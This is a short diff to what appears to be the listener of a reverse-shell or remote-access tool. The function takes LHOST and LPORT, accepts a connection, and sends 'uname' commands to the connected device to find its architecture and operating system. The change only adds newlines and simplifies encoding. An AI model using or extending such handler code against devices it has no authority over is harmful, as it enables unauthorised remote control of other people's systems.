@@ -323,10 +323,10 @@ def server(LHOST, LPORT, handler=handler):
         c, a = s.accept()
         print(G + "Connecting to " + a[0] + "...")
 
-        c.send("uname -p".encode("UTF-8"))
-        device_arch = c.recv(128).decode("UTF-8", "ignore").strip()
-        c.send("uname -s".encode("UTF-8"))
-        device_os = c.recv(128).decode("UTF-8", "ignore").strip()
+        c.send("uname -p\n".encode())
+        device_arch = c.recv(128).decode().strip()
+        c.send("uname -s\n".encode())
+        device_os = c.recv(128).decode().strip()
         
         if device_os == "Linux":
             target_system = "Linux"
